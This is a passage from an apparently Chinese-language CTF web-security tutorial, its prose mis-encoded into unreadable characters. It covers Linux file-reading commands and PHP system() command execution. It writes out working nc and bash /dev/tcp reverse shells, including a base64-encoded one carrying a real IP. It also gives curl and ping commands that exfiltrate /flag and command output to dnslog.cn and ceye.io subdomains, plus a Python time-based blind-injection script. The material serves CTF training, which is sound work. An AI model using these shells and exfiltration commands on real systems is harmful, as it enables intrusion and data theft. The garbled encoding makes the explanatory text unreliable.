‡æœºå™¨æ˜¯å¦å¯è¾¾</td></tr><tr><td>touch</td><td>åˆ›å»ºæ–‡ä»¶</td></tr><tr><td>mkdir</td><td>åˆ›å»ºç›®å½•</td></tr></tbody></table><p>åœ¨ctfæ¯”èµ›å½“ä¸­ï¼Œæœ€å¸¸è§çš„å°±æ˜¯æ–‡ä»¶è¯»å–å‘½ä»¤çš„ç»•è¿‡ï¼Œä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„<strong>æ–‡ä»¶è¯»å–å‘½ä»¤</strong></p><table><thead><tr><th>å‘½ä»¤</th><th>å®é™…æ•ˆæœ</th></tr></thead><tbody><tr><td>cat</td><td>æ–‡ä»¶è¯»å–</td></tr><tr><td>tac</td><td>æ–‡ä»¶è¯»å–ï¼ˆè¡Œå€’åºè¾“å‡ºï¼‰</td></tr><tr><td>more</td><td>æ–‡ä»¶è¯»å–ï¼ˆä¸€é¡µä¸€é¡µæ˜¾ç¤ºï¼‰</td></tr><tr><td>less</td><td>æ–‡ä»¶è¯»å–ï¼ˆä¸€é¡µä¸€é¡µæ˜¾ç¤ºï¼Œå¯ç¿»é¡µï¼‰</td></tr><tr><td>head</td><td>æ–‡ä»¶è¯»å–ï¼ˆæ˜¾ç¤ºå¤´å‡ è¡Œï¼‰</td></tr><tr><td>tail</td><td>æ–‡ä»¶è¯»å–ï¼ˆæ˜¾ç¤ºæœ€åå‡ è¡Œï¼‰</td></tr><tr><td>nl</td><td>æ–‡ä»¶è¯»å–ï¼ˆä¼šè¾“å‡ºè¡Œå·ï¼‰</td></tr><tr><td>vim/vi</td><td>æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå¯ç”¨äºå†…å®¹æŸ¥çœ‹</td></tr><tr><td>nano</td><td>æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå¯ç”¨äºå†…å®¹æŸ¥çœ‹</td></tr><tr><td>emacs</td><td>æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå¯ç”¨äºå†…å®¹æŸ¥çœ‹</td></tr><tr><td>sed -n â€˜1,10pâ€™</td><td>æ–‡ä»¶è¯»å–ï¼ˆæ˜¾ç¤ºå‰10è¡Œï¼‰</td></tr><tr><td>rev</td><td>æ–‡ä»¶è¯»å–ï¼ˆå€’åºè¾“å‡ºï¼‰</td></tr><tr><td>base64</td><td>æ–‡ä»¶è¯»å–ï¼ˆä»¥base64å½¢å¼è¾“å‡ºï¼‰</td></tr><tr><td>strings</td><td>æ–‡ä»¶è¯»å–ï¼ˆæå–æ–‡ä»¶ä¸­å¯è¾“å‡ºçš„å­—ç¬¦ä¸²ï¼‰</td></tr><tr><td>xxd</td><td>æ–‡ä»¶è¯»å–ï¼ˆäºŒè¿›åˆ¶å½¢å¼è¾“å‡ºï¼‰</td></tr><tr><td>hexdump</td><td>æ–‡ä»¶è¯»å–ï¼ˆ16è¿›åˆ¶å½¢å¼è¾“å‡ºï¼‰</td></tr><tr><td>od</td><td>æ–‡ä»¶è¯»å–ï¼ˆ8è¿›åˆ¶å½¢å¼è¾“å‡ºï¼‰</td></tr><tr><td>uniq</td><td>æ–‡ä»¶è¯»å–ï¼ˆä¼šå»æ‰é‡å¤è¡Œï¼‰</td></tr><tr><td>cp</td><td>æ–‡ä»¶å¤åˆ¶ï¼ˆå¯ç”¨äºçªç ´ç›®æ ‡æ–‡ä»¶æƒé™é™åˆ¶ï¼‰</td></tr></tbody></table><h4 id="å…¶å®ƒå‘½ä»¤">å…¶å®ƒå‘½ä»¤</h4><p>é™¤äº†ä»¥ä¸Šçš„å¸¸è§å‘½ä»¤å¤–è¿˜æœ‰å…¶å®ƒçš„ä¸€äº›å¸¸ç”¨å‘½ä»¤</p><h5 id="find"><strong>find</strong></h5><p>å¸¸ç”¨äºåœ¨linuxç³»ç»Ÿä¸­æŸ¥æ‰¾æŸæ–‡ä»¶ï¼ˆæ”¯æŒé€šé…ç¬¦ï¼‰çš„å…·ä½“ä½ç½®</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name flag</span><br><span class="line"><span class="built_in">find</span> / -name f*</span><br><span class="line"><span class="built_in">find</span> / -name fla?</span><br><span class="line">/ä¸ºæŸ¥æ‰¾çš„èµ·å§‹æ ¹ç›®å½•ï¼Œä»¥ä¸Šå‘½ä»¤ä¼šä»¥/ï¼ˆæ ¹ç›®å½•ï¼‰ä¸ºæŸ¥æ‰¾æ ¹ç›®å½•ï¼Œåœ¨å…¶ä»¥åŠå…¶å­ç›®å½•ä¸­æŸ¥æ‰¾ç¬¦åˆåç»­å‘½åè§„åˆ™çš„æ–‡ä»¶</span><br></pre></td></tr></table></figure><h5 id="sed"><strong>sed</strong></h5><p>åœ¨æŸäº›æƒ…å†µéœ€è¦å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œé€‚å½“ä¿®æ”¹ï¼Œä½†é¢˜ç›®ç¯å¢ƒå¹¶æœªæä¾›viç­‰æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæ­¤æ—¶å¯ä»¥åˆ©ç”¨sedè¾¾åˆ°ç²¾å‡†æ›¿æ¢æŸè¡Œçš„ç›®çš„</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å®ç°æ ¼å¼ä¸ºï¼š</span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;è¡Œæ•°s/åŸå†…å®¹/æ›¿æ¢ä¸ºçš„å†…å®¹/&#x27;</span> æ–‡ä»¶å</span><br><span class="line"></span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;2s/x\.x\.x\.x/150.158.24.228/&#x27;</span> filename</span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;3s/7002/7000/&#x27;</span> filename</span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;4s/.*//&#x27;</span> filename</span><br></pre></td></tr></table></figure><p>PSï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>.è¯¥å‘½ä»¤æ”¯æŒé€šé…ç¬¦</span><br><span class="line"><span class="attribute">2</span>.è¯¥å‘½ä»¤å¯¹äºç‰¹æ®Šç¬¦å·éœ€è¦ç”¨\è¿›è¡Œè½¬ä¹‰ï¼Œå¦‚ä¸Šè¿°çš„ä¾‹<span class="number">1</span>ä¸­çš„.</span><br></pre></td></tr></table></figure><h5 id="echo"><strong>echo</strong></h5><p>å¦‚æœéœ€è¦å¤§è§„æ¨¡å†™å…¥å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨base64ç¼–ç é˜²æ­¢æ•°æ®ä¸¢å¤±ï¼Œå†ç»“åˆechoå°†å†…å®¹å†™å…¥æŒ‡å®šæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å®ç°æ ¼å¼ä¸ºï¼š</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;base64ç¼–ç çš„æ•°æ®&#x27;</span> | <span class="built_in">base64</span> -d &gt; filename</span><br></pre></td></tr></table></figure><h2 id="äºŒã€å‘½ä»¤æ‰§è¡Œ">äºŒã€å‘½ä»¤æ‰§è¡Œ</h2><h3 id="systemç±»å‘½ä»¤æ‰§è¡Œ">systemç±»å‘½ä»¤æ‰§è¡Œ</h3><p>æ‰€è°“systemç±»å‘½ä»¤æ‰§è¡Œå³æ˜¯åŸé¢˜ç›®å·²ç»ç»™å‡ºsystemå‡½æ•°ï¼Œä¸”å…¶å‚æ•°æ˜¯å¯æ§çš„è¿™ç§æƒ…å†µï¼Œä¸‹é¢å°†ä»¥phpä¸ºä¾‹ç€é‡è®²è§£è¯¥æƒ…å†µä¸‹çš„å‘½ä»¤æ‰§è¡Œæ–¹å¼ä»¥åŠç»•è¿‡å§¿åŠ¿</p><p><strong>ç¤ºä¾‹ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="æ— å›æ˜¾rce">æ— å›æ˜¾rce</h4><p>åœ¨1.3èŠ‚å¼€ç¯‡æˆ‘ä»¬æåˆ°äº†å¾ˆå¤šå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œä»–ä»¬éƒ½å¯ä»¥è¾¾æˆæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç›®çš„ï¼Œä½†å…¶ä¸­çš„ä¸€äº›å‡½æ•°ä¼šä¸ä¼šå°†æ‰§è¡Œçš„ç»“æœå›æ˜¾ï¼Œä¾‹å¦‚execå‡½æ•°ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦é€šè¿‡æŸäº›æ‰‹æ³•å¾—åˆ°å›æ˜¾ï¼Œä¸‹é¢å°†å¯¹è¿™äº›æ‰‹æ³•è¿›è¡Œè¯¦ç»†è®²è§£</p><h5 id="åå¼¹shell">åå¼¹shell</h5><h6 id="vpsç®€ä»‹"><strong>vpsç®€ä»‹</strong></h6><p>ä½œä¸ºä¸€ååˆæ ¼çš„webæ‰‹ï¼Œä¸€å°vpsæ˜¯å¿…ä¸å¯å°‘çš„ï¼Œæ‰€è°“vpså°±æ˜¯ä¸€å°å…·æœ‰å…¬ç½‘ipçš„æœåŠ¡å™¨ï¼Œå¯ä»ä¸‹é¢ä¸‰æ–¹å‚å®¶è·å–</p><p>1.åä¸ºäº‘ï¼š<a href="https://www.huaweicloud.com/%EF%BC%88%E4%BA%91%E8%80%80%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89">https://www.huaweicloud.com/ï¼ˆäº‘è€€äº‘æœåŠ¡å™¨ï¼‰</a></p><p>2.è…¾è®¯äº‘ï¼š<a href="https://cloud.tencent.com/%EF%BC%88%E8%BD%BB%E9%87%8F%E5%9E%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89">https://cloud.tencent.com/ï¼ˆè½»é‡å‹æœåŠ¡å™¨ï¼‰</a></p><p>3.é˜¿é‡Œäº‘ï¼š<a href="https://www.aliyun.com/">https://www.aliyun.com/</a></p><p>æœåŠ¡å™¨å’Œæˆ‘ä»¬ä¸ªäººPCç”µè„‘æœ€å¤§çš„åŒºåˆ«å°±æ˜¯å…·æœ‰å…¬ç½‘ipï¼Œå®é™…æ•ˆæœå°±æ˜¯ä»»æ„ç”¨æˆ·çš†å¯è¾¾æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼ˆå¯pingé€šï¼‰ï¼Œè€Œä¸ªäººPCç”µè„‘ç»å¤§å¤šæ•°æƒ…å†µæ˜¯æ— æ³•å®ç°è¯¥åŠŸèƒ½çš„ã€‚è¯¦ç»†è´­ä¹°æµç¨‹ä»¥åŠäº§å“è®¯æ¯å¯ä¸å¯¹åº”å®¢æœæ¢è®¨ï¼ŒæˆåŠŸè´­ä¹°åå³å¯ä½¿ç”¨sshï¼ˆæœåŠ¡å™¨è‡ªå¸¦çš„è¿œç¨‹è¿æ¥å·¥å…·ï¼‰æˆ–ç”µè„‘è‡ªå¸¦çš„è¿œç¨‹æ¡Œé¢åŠŸèƒ½è¿›è¡ŒæœåŠ¡å™¨ç™»å½•</p><p><strong>1.sshç™»å½•</strong></p><p>sshè½¯ä»¶æ¨ètermius</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123171841669.png" alt="image-20240123171841669"></p><p>ä»å‚å®¶è·å–è´¦å·å¯†ç ä»¥åŠå…¬ç½‘ipåå°†å…¶å¡«å…¥1ï¼Œ2ï¼Œ3å¤„ï¼Œç„¶åç‚¹å‡»4å¤„å³å¯è¿œç¨‹è¿æ¥åˆ°æœåŠ¡å™¨</p><p><strong>2.ç”µè„‘è‡ªå¸¦è¿œç¨‹æ¡Œé¢åŠŸèƒ½ç™»å½•</strong>ï¼ˆå¸¸ç”¨äºwinç³»ç»Ÿï¼‰</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123172206857.png" alt="image-20240123172206857"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123172217584.png" alt="image-20240123172217584"></p><p>åœ¨æ­¤ç•Œé¢è¾“å…¥å…¬ç½‘ipï¼Œç¨åå†è¾“å…¥å‚å®¶ç»™äºˆçš„è´¦å·å¯†ç å³å¯ç™»å½•æˆåŠŸ</p><h6 id="åå¼¹æ‰‹æ³•">åå¼¹æ‰‹æ³•</h6><p><strong>1.ncåå¼¹</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">æ­£å‘è¿æ¥ï¼š</span><br><span class="line">linuxé¶æœº:nc -e <span class="regexp">/bin/</span>bash -lvvnp ç«¯å£</span><br><span class="line">winé¶æœº:nc -e cmd -lvvnp ç«¯å£     <span class="regexp">//</span>winç³»ç»Ÿä¸è‡ªå¸¦ncï¼Œéœ€è¦æ‰‹åŠ¨ä¸Šä¼ ï¼Œæ­¤å¤„ncå¹¶éå›ºå®šï¼Œæ ¹æ®å®é™…ä¸Šä¼ çš„ç¨‹åºååšç›¸åº”ä¿®æ”¹</span><br><span class="line">æ”»å‡»æœº:nc é¶æœºip ç«¯å£</span><br><span class="line"></span><br><span class="line">åå‘è¿æ¥ï¼š</span><br><span class="line">linuxé¶æœº:nc -e <span class="regexp">/bin/</span>bash æ”»å‡»æœºip ç«¯å£</span><br><span class="line">winé¶æœº:nc -e cmd æ”»å‡»æœºip ç«¯å£</span><br><span class="line">æ”»å‡»æœº:nc -lvvnp ç«¯å£</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>ä¸Šè¿°æ‰€æœ‰æ“ä½œçš†æ˜¯å¸¦æœ‰-lvvnpçš„æ“ä½œï¼ˆç«¯å£ç›‘å¬ï¼‰ä¼˜å…ˆ</span><br></pre></td></tr></table></figure><p><strong>2.bashåå¼¹</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æ”»å‡»æœº<span class="symbol">:nc</span> -lvvnp ç«¯å£</span><br><span class="line">é¶æœº<span class="symbol">:bash</span> -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/æ”»å‡»æœºip/æ”»å‡»æœºç›‘å¬çš„ç«¯å£ 0&gt;&amp;1&quot;</span></span><br><span class="line">æ•°ç»„ç‰ˆé¶æœºï¼ˆjavaæºç ï¼‰<span class="symbol">:bash</span> -c &#123;echo,<span class="title class_">YmFzaCAtaSA</span>+<span class="title class_">JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzI1MCAwPiYx</span>&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">//ä½¿ç”¨æ—¶éœ€è¦å¯¹å‘½ä»¤ä¸­çš„ç¼–ç éƒ¨åˆ†è§£ç ï¼Œå°†å…¶ä¸­çš„ipå’Œç«¯å£ä¿®æ”¹ä¸ºæ”»å‡»æœºipæ®µç«¯å£åå¹¶é‡æ–°ç¼–ç æ‰å¯ä½¿ç”¨ï¼Œæµè§ˆå™¨ä¼ å‚æ—¶éœ€è¦urlç¼–ç </span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹æ¼”ç¤º</p><p>1.åœ¨é¶æœº**å¯è¾¾çš„æœºå™¨ï¼ˆå¯pingé€šï¼Œå¦‚å…¬ç½‘æœåŠ¡å™¨æˆ–åŒç½‘æ®µæœºå™¨ï¼‰**ä¸Šç›‘å¬ç«¯å£</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123174432194.png" alt="image-20240123174432194"></p><p>2.åœ¨é¶æœºä¸Šæ‰§è¡Œbashåå¼¹å‘½ä»¤</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123174611797.png" alt="image-20240123174611797"></p><p>3.æŸ¥çœ‹åˆšåˆšç›‘å¬ç«¯å£çš„æœåŠ¡å™¨</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123174641283.png" alt="image-20240123174641283"></p><p>å¯ä»¥å‘ç°åå¼¹shellæˆåŠŸï¼Œæ­¤æ—¶å¯æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤</p><p><strong>3.å†™shellæ–‡ä»¶åæ‰§è¡Œ</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åˆ›å»º<span class="keyword">shell</span>.<span class="keyword">sh</span></span><br><span class="line">bash -<span class="keyword">c</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/æœåŠ¡å™¨ip/ç«¯å£ 0&gt;&amp;1&quot;</span></span><br><span class="line">å°†ä¸Šè¿°bashåå¼¹å‘½ä»¤å†™å…¥æ–‡ä»¶ï¼Œè¯¦è§<span class="number">1.2</span>.<span class="number">3</span>èŠ‚ä¸­çš„<span class="keyword">echo</span>ç”¨æ³•</span><br><span class="line">./<span class="keyword">shell</span>.<span class="keyword">sh</span></span><br><span class="line">åˆ©ç”¨.æ‰§è¡Œ<span class="keyword">shell</span>.<span class="keyword">sh</span>åå¼¹<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><p><strong>æ­£å‘è¿æ¥ä¸åå‘è¿æ¥ç®€ä»‹</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123172902417.png" alt="image-20240123172902417"></p><p>PC1ã€PC2ã€PC3ä¸ºæˆ‘ä»¬çš„ç›®æ ‡æœºå™¨ï¼Œæ­¤æ—¶ä¸éš¾å‘ç°ä¸‰å°é¶æœºéƒ½å¤„äºå†…ç½‘ç¯å¢ƒ</p><p>æ­£å‘è¿æ¥ï¼šæ”»å‡»æœºä¸»åŠ¨è¿æ¥é¶æœº</p><p>åå‘è¿æ¥ï¼šé¶æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœº</p><p>å‡†åˆ™ï¼šè°è¢«åŠ¨ï¼Œè°ç›‘å¬</p><p>åœ¨ä¸Šè¿°ç¯å¢ƒä¸­ï¼Œæœ‰ä¸”ä»…æœ‰<strong>å¯è®¿é—®è·¯ç”±</strong>ã€<strong>linuxå¤–ç½‘æœåŠ¡å™¨</strong>ã€<strong>windowsæœåŠ¡å™¨</strong>è¿™ä¸‰ä¸ªipæ˜¯å¯è®¿é—®çš„ï¼Œè€Œæˆ‘ä»¬çš„ä¸‰å°PCé¶æœºæ­¤æ—¶å¤„äºå†…ç½‘ç¯å¢ƒï¼Œç›¸å½“äºæˆ‘ä»¬çš„ä¸ªäººPCç”µè„‘ï¼Œæ­¤æ—¶æ˜¯æ— æ³•è®¿é—®çš„ï¼Œæˆ‘ä»¬çš„å¤–ç½‘æœåŠ¡å™¨æœ€å¤šåªå¯è‡´<strong>å¯è®¿é—®è·¯ç”±</strong>å¤„ï¼Œå³æ”»å‡»æœºæ— æ³•ä¸»åŠ¨è¿æ¥åˆ°é¶æœºï¼Œæ‰€ä»¥æ­¤æ—¶å°±æ— æ³•æ­£å‘è¿æ¥ã€‚ç”±äºæˆ‘ä»¬å¤–ç½‘æœåŠ¡å™¨çš†ä¸º<strong>å…¬ç½‘æœåŠ¡å™¨</strong>ï¼Œæ‰€ä»¥ä¸‰å°PCé¶æœºæ˜¯å¯ä»¥è®¿é—®åˆ°æœåŠ¡å™¨çš„ï¼Œå³å¯ä»¥è¿›è¡Œåå‘è¿æ¥ï¼Œè®©é¶æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä¸Šé¢æ¼”ç¤ºçš„bashåå¼¹çš„æ“ä½œã€‚</p><h5 id="æ•°æ®å†™å‡º">æ•°æ®å†™å‡º</h5><p>å°†å‘½ä»¤çš„æ‰§è¡Œç»“æœå†™å…¥å…¶ä»–æ–‡ä»¶ï¼Œå†è®¿é—®å…¶ä»–æ–‡ä»¶è·å–æ‰§è¡Œç»“æœï¼Œä¸‹ä»¥1.txtä¸ºä¾‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨<span class="built_in">cp</span>å‘½ä»¤ï¼š<span class="built_in">cp</span> flag.php 1.txt</span><br><span class="line"></span><br><span class="line">åˆ©ç”¨<span class="built_in">mv</span>å‘½ä»¤ï¼š<span class="built_in">mv</span> flag.php 1.txt</span><br><span class="line"></span><br><span class="line">åˆ©ç”¨&gt;è¾“å‡ºç»“æœåˆ°æ–‡ä»¶ï¼š<span class="built_in">ls</span> &gt; 1.txt</span><br><span class="line"></span><br><span class="line">åˆ©ç”¨<span class="built_in">tee</span>å‘½ä»¤ï¼š<span class="built_in">ls</span> | <span class="built_in">tee</span> 1.txt    //teeä¼šä»ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ï¼Œå¹¶å°†å…¶å†™å…¥æ–‡ä»¶ä»¥åŠæ ‡å‡†è¾“å‡º</span><br><span class="line"></span><br><span class="line">åˆ©ç”¨scriptå‘½ä»¤ï¼š<span class="built_in">ls</span> | script 1.txt  //ä¼šå¼€å¯å‘½ä»¤è®°å½•ï¼Œå‘½ä»¤æ‰§è¡ŒçŠ¶æ€ä»¥åŠç»“æœéƒ½å°†ä¼šå†™å…¥æ–‡ä»¶ä¸­</span><br></pre></td></tr></table></figure><h5 id="æ•°æ®å¤–å¸¦">æ•°æ®å¤–å¸¦</h5><p>åœ¨é¢˜ç›®ç¯å¢ƒå‡ºç½‘çš„æ¡ä»¶ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ•°æ®å¤–å¸¦å°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœå¤–å¸¦å‡ºæ¥ï¼Œæ­¤å¤„æ¨èä¸¤ä¸ªå¤–å¸¦ç½‘å€ï¼š</p><p>1.<a href="http://dnslog.cn">http://dnslog.cn</a></p><p>2.<a href="http://ceye.io/%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%8C%E6%9B%B4%E7%A8%B3%E5%AE%9A%EF%BC%89">http://ceye.io/ï¼ˆæ¨èï¼Œæ›´ç¨³å®šï¼‰</a></p><p>linuxçš„æ•°æ®å¤–å¸¦å½’åŠŸäºå…¶åå¼•å·å¯æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤è¿™ä¸€ç‰¹æ®Šæœºåˆ¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">å•è¡Œä¼ è¾“ï¼š</span><br><span class="line">ping `<span class="built_in">whoami</span>`.dnsåœ°å€</span><br><span class="line">curl http://dnsåœ°å€/`<span class="built_in">whoami</span>`</span><br><span class="line"></span><br><span class="line">//whoamiå³ä¸ºæˆ‘ä»¬è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼Œå°†å…¶ç”¨``åŒ…è£¹ååˆ©ç”¨.å°†å…¶ä¸æˆ‘ä»¬çš„dnsåœ°å€è¿›è¡Œæ‹¼æ¥ï¼Œæ‰§è¡Œå‘½ä»¤åå³å¯åœ¨dnså¤„å¾—åˆ°<span class="built_in">whoami</span>å‘½ä»¤çš„å›æ˜¾</span><br><span class="line"></span><br><span class="line">å¤šè¡Œä¼ è¾“ï¼š(å¤–å¸¦åªä¼šæ˜¾ç¤ºç¬¬ä¸€è¡Œçš„æ•°æ®)</span><br><span class="line">curl http://y91yp4.ceye.io/`<span class="built_in">ls</span> / | <span class="built_in">base64</span>`     //å°†ç»“æœè¿›è¡Œ<span class="built_in">base64</span>ç¼–ç åå¤–å¸¦å‡ºæ¥</span><br><span class="line">curl http://y91yp4.ceye.io/`<span class="built_in">whoami</span> | sed -n <span class="string">&#x27;2p&#x27;</span>`    //è¾“å‡ºå›ºå®šè¡Œçš„ç»“æœ</span><br><span class="line">curl -T /flag http://y91yp4.ceye.io/      //æŒ‡å®šæ–‡ä»¶å¤–å¸¦</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä¼šå°±è¿™ä¸¤ä¸ªå¤–å¸¦å¹³å°è¿›è¡Œæ¼”ç¤º</p><p><strong>1.dnslog</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123182359664.png" alt="image-20240123182359664"></p><p>é¦–å…ˆç‚¹å‡»get subdomainï¼Œå³å¯è·å¾—2æ‰€ç¤ºçš„urlåœ°å€ï¼Œéšåå³å¯åœ¨é¶æœºæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.dnsåœ°å€</span><br><span class="line">ping `whoami`.b854kz.dnslog.cn</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123182554193.png" alt="image-20240123182554193"></p><p>ç‚¹å‡ ä¸‹refresh recordï¼ˆç‚¹æˆgetå°±å¾—é‡æ–°æäº†ï¼‰å³å¯è·å¾—å›æ˜¾ï¼Œå¯ä»¥å¾—åˆ°é¶æœºå½“å‰ç”¨æˆ·ä¸ºroot</p><p><strong>2.ceye</strong></p><p>å¹³å°å´©äº†ï¼Œå°å¯„ã€‚</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123183023358.png" alt="image-20240123183023358"></p><p>loginå¤„ç™»å½•ååº”ä¸ºprofileï¼Œåœ¨profileå‡ºå¾—åˆ°urlåœ°å€åå³å¯æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="regexp">//y</span>91yp4.ceye.io<span class="regexp">/`ls /</span> | base64` </span><br></pre></td></tr></table></figure><p>ç‚¹å‡ ä¸‹reloadå³å¯å¾—åˆ°å›æ˜¾ç»“æœ</p><h5 id="ç›²æ³¨">ç›²æ³¨</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://localhost.test.php/?c=&#x27;</span></span><br><span class="line">dic=string.printable[:-<span class="number">6</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    judge=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        now=<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>a=$(cat /flag | head -1 | cut -b <span class="subst">&#123;i&#125;</span>);if [ $a = <span class="subst">&#123;j&#125;</span> ];then sleep 2;fi&#x27;</span></span><br><span class="line">        start=time.time()</span><br><span class="line">        r=requests.get(now)</span><br><span class="line">        end=time.time()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(end)-<span class="built_in">int</span>(start) &gt;<span class="number">1</span>:</span><br><span class="line">            judge=<span class="number">1</span></span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> judge==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒå‘½ä»¤åˆ†æ</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 